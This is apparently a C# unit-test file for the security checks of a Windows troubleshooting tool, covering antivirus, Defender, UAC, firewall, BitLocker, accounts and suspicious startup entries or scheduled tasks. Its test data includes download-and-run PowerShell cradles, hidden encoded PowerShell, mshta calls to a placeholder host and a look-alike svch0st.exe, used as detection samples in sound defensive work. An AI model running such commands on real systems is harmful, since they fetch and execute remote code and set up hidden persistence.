using Troubleshootr.Checks;
using Troubleshootr.Checks.Network;
using Troubleshootr.Checks.Performance;
using Troubleshootr.Checks.Security;
using Troubleshootr.Checks.Storage;
using Troubleshootr.Checks.Updates;
using Troubleshootr.Collectors.Support;
using Troubleshootr.Core;
using Xunit;

namespace Troubleshootr.Tests;

/// <summary>Phase 8: antivirus, Defender, firewall, UAC, startup and task persistence, accounts, encryption, remote access.</summary>
public class SecurityTests
{
    private static List<Finding> Run(ICheck check, Snapshot s) => check.Run(s).ToList();
    private static Severity? Sev(ICheck check, Snapshot s) => Run(check, s).SingleOrDefault()?.Severity;
    private static SecurityInfo Sec(Snapshot s) => s.Security!.Value!;

    private static readonly string[] PhaseChecks = ["SEC-001", "SEC-002", "SEC-003", "SEC-004", "SEC-005", "SEC-006", "SEC-007", "SEC-008", "SEC-009", "SEC-010", "STO-017", "UPD-007", "PRF-004", "NET-011"];

    [Fact]
    public void HealthySnapshotHasNoSecurityFindings()
    {
        var s = Snap.Healthy();
        foreach (var check in CheckRegistry.All.Where(c => PhaseChecks.Contains(c.Id)))
            Assert.Empty(Run(check, s));
        Assert.Equal(PhaseChecks.Length, CheckRegistry.All.Count(c => PhaseChecks.Contains(c.Id)));
    }

    [Fact]
    public void ProductStateDecoding()
    {
        Assert.Equal((true, true), AvProduct.Decode(0x061100));   // Defender on, up to date
        Assert.Equal((false, true), AvProduct.Decode(0x060100));  // off
        Assert.Equal((true, false), AvProduct.Decode(0x041110));  // on, out of date
    }

    [Fact]
    public void Sec001AndPrf004()
    {
        var none = Snap.Healthy().With(x => { Sec(x).Antivirus[0].Enabled = false; Sec(x).Defender!.RealTimeProtection = false; Sec(x).Defender!.AntivirusEnabled = false; });
        Assert.Equal(Severity.Critical, Sev(new Sec001Antivirus(), none));
        Assert.Empty(Run(new Sec001Antivirus(), none.With(x => Sec(x).SecurityCenter = false)));  // Windows Server

        // Third-party installed properly: Defender goes passive, one antivirus.
        var norton = Snap.Healthy().With(x => { Sec(x).Antivirus.Add(new AvProduct { Name = "Norton 360", Enabled = true, UpToDate = true }); Sec(x).Defender!.RunningMode = "Passive Mode"; });
        Assert.Empty(Run(new Sec001Antivirus(), norton));
        Assert.Empty(Run(new Prf004TwoAntivirus(), norton));
        Assert.Contains("Norton 360", Assert.Single(Run(new Prf004TwoAntivirus(), norton.With(x => Sec(x).Antivirus.Add(new AvProduct { Name = "McAfee", Enabled = true, UpToDate = true })))).Evidence);
        Assert.Equal("Norton 360 is out of date", Assert.Single(Run(new Sec001Antivirus(), Snap.Healthy().With(x =>
        {
            Sec(x).Antivirus.Add(new AvProduct { Name = "Norton 360", Enabled = true, UpToDate = false }); Sec(x).Defender!.RunningMode = "Passive Mode";
        }))).Title);
    }

    [Fact]
    public void Sec002AndUpd007Defender()
    {
        Assert.Equal(Severity.Warning, Sev(new Sec002Defender(), Snap.Healthy().With(x => Sec(x).Defender!.RealTimeProtection = false)));
        var threat = Snap.Healthy().With(x => Sec(x).Threats = [new() { Name = "Trojan:Win32/Wacatac", Severity = 5, DetectedUtc = Snap.Now.AddDays(-2), Removed = false, Where = @"file:_C:\Users\x\Downloads\setup.exe" }]);
        var f = Assert.Single(Run(new Sec002Defender(), threat));
        Assert.Equal(Severity.Critical, f.Severity);
        Assert.Contains(@"in C:\Users\x\Downloads\setup.exe", f.Evidence);
        Assert.Equal(Severity.Info, Sev(new Sec002Defender(), Snap.Healthy().With(x => Sec(x).Threats = [new() { Name = "PUA:Win32/Presenoker", Removed = true, DetectedUtc = Snap.Now }])));

        Assert.Equal("Defender's virus definitions are 12 days old", Assert.Single(Run(new Upd007DefenderDefinitions(), Snap.Healthy().With(x => Sec(x).Defender!.SignatureAgeDays = 12))).Title);
        Assert.Empty(Run(new Upd007DefenderDefinitions(), Snap.Healthy().With(x => { Sec(x).Defender!.SignatureAgeDays = 40; Sec(x).Defender!.RunningMode = "Passive Mode"; })));
    }

    [Fact]
    public void Sec003Uac()
    {
        Assert.Equal(Severity.Warning, Sev(new Sec003Uac(), Snap.Healthy().With(x => Sec(x).UacOn = false)));
        Assert.Equal(Severity.Info, Sev(new Sec003Uac(), Snap.Healthy().With(x => Sec(x).UacAdminPrompt = 0)));
    }

    [Fact]
    public void Sec004StartupAndSec010Tasks()
    {
        Snapshot With(StartupEntry e) => Snap.Healthy().With(x => x.Startup!.Value!.Entries.Add(e));
        Assert.Empty(Run(new Sec004SuspiciousStartup(), With(new() { Name = "Discord", Command = @"C:\Users\a\AppData\Local\Discord\Update.exe", File = @"C:\Users\a\AppData\Local\Discord\Update.exe", Signed = true })));
        Assert.Empty(Run(new Sec004SuspiciousStartup(), With(new() { Name = "Plannr", File = @"C:\Users\a\AppData\Local\Programs\Plannr\Plannr.exe", Signed = false })));  // unsigned, normal place
        Assert.Contains("temp or public folder", Assert.Single(Run(new Sec004SuspiciousStartup(), With(new() { Name = "svc", Command = @"C:\Users\a\AppData\Local\Temp\svc.exe", File = @"C:\Users\a\AppData\Local\Temp\svc.exe", Signed = false }))).Evidence);
        Assert.Contains("random-looking name", Assert.Single(Run(new Sec004SuspiciousStartup(), With(new() { Name = "x", File = @"C:\Users\a\AppData\Roaming\qzxkvbtw.exe", Signed = false }))).Evidence);
        Assert.Contains("encoded PowerShell", Assert.Single(Run(new Sec004SuspiciousStartup(), With(new() { Name = "Update", Command = "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=" }))).Evidence);
        Assert.Empty(Run(new Sec004SuspiciousStartup(), With(new() { Name = "Off", Command = "mshta http://x", Enabled = false })));

        Assert.Equal("PowerShell that downloads or runs hidden code", SuspiciousCommand.Why("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\""));
        Assert.Equal("script from a user or temp folder", SuspiciousCommand.Why(@"wscript.exe C:\Users\a\AppData\Roaming\x.vbs"));
        Assert.Null(SuspiciousCommand.Why(@"""C:\Program Files\Google\Update\GoogleUpdate.exe"" /ua /installsource scheduler"));
        Assert.Null(SuspiciousCommand.Why(@"powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\backup.ps1"));
        Assert.Equal(Severity.Warning, Sev(new Sec010ScriptTasks(), Snap.Healthy().With(x => Sec(x).SuspiciousTasks.Add(new SuspiciousTask { Name = @"\Updater", Command = "mshta http://x", Reason = "mshta" }))));
    }

    [Fact]
    public void Sec005To007()
    {
        Assert.Equal(Severity.Warning, Sev(new Sec005BrowserPolicies(), Snap.Healthy().With(x => Sec(x).BrowserPolicies.Add(new BrowserPolicy { Browser = "Chrome", Kind = "Search engine", Value = "https://search.example/?q={searchTerms}" }))));

        var anydesk = Snap.Healthy().With(x => { x.Software!.Value!.Programs.Add(new InstalledProgram { Name = "AnyDesk", InstallDate = Snap.Now.AddDays(-1) }); Sec(x).RemoteToolsRunning.Add("AnyDesk"); });
        var f = Assert.Single(Run(new Sec006RemoteAccess(), anydesk));
        Assert.Equal("A remote-access app was installed recently", f.Title);
        Assert.Contains("running", f.Evidence);
        Assert.Equal("1 remote-access app installed", Assert.Single(Run(new Sec006RemoteAccess(), Snap.Healthy().With(x => x.Software!.Value!.Programs.Add(new InstalledProgram { Name = "TeamViewer", InstallDate = Snap.Now.AddYears(-1) })))).Title);

        var noTpm = Snap.Healthy().With(x => { Sec(x).TpmVersion = ""; x.Board!.Value!.FirmwareType = "UEFI"; x.Board!.Value!.SecureBoot = false; });
        Assert.Contains("Secure Boot is off; no TPM", Assert.Single(Run(new Sec007PlatformSecurity(), noTpm)).Evidence);
    }

    [Fact]
    public void Sto017BitLocker()
    {
        Assert.Equal("BitLocker is on on C:", Assert.Single(Run(new Sto017BitLocker(), Snap.Healthy().With(x => Sec(x).BitLocker[0].Protection = 1))).Title);
        Assert.Equal("C: is encrypted but not protected yet", Assert.Single(Run(new Sto017BitLocker(), Snap.Healthy().With(x => Sec(x).BitLocker[0].Protection = 8))).Title);
    }

    [Fact]
    public void Sec008To009AndNet011()
    {
        var guest = Snap.Healthy().With(x => Sec(x).Accounts[1].Disabled = false);
        Assert.Equal("The Guest account is enabled", Assert.Single(Run(new Sec008Accounts(), guest)).Title);
        Assert.Equal("The built-in Administrator account is enabled", Assert.Single(Run(new Sec008Accounts(), Snap.Healthy().With(x => Sec(x).Accounts[0].Disabled = false))).Title);

        Assert.Equal(Severity.Warning, Sev(new Sec009SmbRdp(), Snap.Healthy().With(x => Sec(x).Smb1Server = true)));
        Assert.Equal(Severity.Info, Sev(new Sec009SmbRdp(), Snap.Healthy().With(x => Sec(x).RdpEnabled = true)));
        Assert.Equal(Severity.Warning, Sev(new Sec009SmbRdp(), Snap.Healthy().With(x => { Sec(x).RdpEnabled = true; Sec(x).RdpNla = false; })));

        var off = Snap.Healthy().With(x => { Sec(x).FirewallPublic = false; Sec(x).ListeningPorts = [445, 3389]; });
        var f = Assert.Single(Run(new Net011Firewall(), off));
        Assert.Equal("Windows Firewall is off for public networks", f.Title);
        Assert.Contains("Remote Desktop 3389", f.Evidence);
        Assert.Empty(Run(new Net011Firewall(), off.With(x => Sec(x).Firewalls.Add("ESET Firewall"))));
    }

    [Fact]
    public void CommandParsing()
    {
        var notepad = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "notepad.exe");
        Assert.Equal(notepad, Signatures.FileOf($"\"{notepad}\" /A file.txt"), ignoreCase: true);
        Assert.Equal(notepad, Signatures.FileOf($"{notepad} /A file.txt"), ignoreCase: true);
        Assert.EndsWith(@"\rundll32.exe", Signatures.FileOf("rundll32.exe shell32.dll,Control_RunDLL"), StringComparison.OrdinalIgnoreCase);
        Assert.Equal(@"C:\Missing\app.exe", Signatures.FileOf(@"C:\Missing\app.exe --flag"));
        Assert.Null(Signatures.FileOf(""));
    }

    [Fact]
    public void ReviewFixes()
    {
        // Only Windows' catalog-signed folders are skipped; C:\Windows\Temp is checked (droppers love it).
        Assert.True(StartupEntry.IsWindowsFile(@"C:\WINDOWS\system32\SecurityHealthSystray.exe"));
        Assert.True(StartupEntry.IsWindowsFile(@"C:\Windows\explorer.exe"));
        Assert.False(StartupEntry.IsWindowsFile(@"C:\Windows\Temp\svch0st.exe"));
        Assert.Equal(Severity.Warning, Sev(new Sec004SuspiciousStartup(), Snap.Healthy().With(x => x.Startup!.Value!.Entries.Add(new StartupEntry { Name = "svc", File = @"C:\Windows\Temp\svch0st.exe", Signed = false }))));

        // Look-alike task folders aren't skipped.
        Assert.True(TaskWalk.IsWindowsFolder(@"\Microsoft\Windows\Defrag"));
        Assert.False(TaskWalk.IsWindowsFolder(@"\MicrosoftSystemUpdate"));

        // A logon task with an encoded command is reported once, by SEC-010, not again by SEC-004.
        Assert.Empty(Run(new Sec004SuspiciousStartup(), Snap.Healthy().With(x => x.Startup!.Value!.Entries.Add(new StartupEntry { Name = "t", Location = "Scheduled task", Command = "mshta http://x" }))));

        // Unsigned is only said of program files that really lack a signature.
        Assert.Equal((null, null), Signatures.Check(Path.Combine(Path.GetTempPath(), "none.bat")));
        Assert.False(Signatures.Check(typeof(SecurityTests).Assembly.Location).Signed);
        var signed = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Windows Defender\MpCmdRun.exe");
        if (File.Exists(signed)) Assert.True(Signatures.Check(signed).Signed);
    }

    [Fact]
    public void AnonymizerBlanksAccountNames()
    {
        var s = Snap.Healthy();
        Anonymizer.Apply(s);
        Assert.All(Sec(s).Accounts, a => Assert.Equal(Anonymizer.Redacted, a.Name));
    }
}
